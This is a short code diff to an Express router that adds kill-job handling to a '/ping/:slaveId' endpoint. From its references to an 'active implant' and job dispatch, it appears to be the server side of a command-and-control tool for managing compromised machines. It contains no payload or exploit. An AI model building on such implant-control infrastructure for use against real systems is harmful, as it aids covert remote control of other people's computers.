@@ -51,6 +51,18 @@ router.get("/ping/:slaveId", (req, res) => {
         return;
     }
 
+    // Check if active implant has jobs running we want to kill.
+    const killList = databaseHelper.getKillList(req.params.slaveId);
+    if (killList.length > 0) {
+
+        // Once per time.
+        console.log("Killing job " + killList[0].jobId)
+
+        databaseHelper.killJob(killList[0].jobId)
+        res.json({code: responseHelper.KILL_JOB, jobId: killList[0].jobId})
+        return;
+    }
+
     // Send job details.
     res.json({code: responseHelper.NEW_OBJECT, id: job.id, size: job.objectSize})
 })
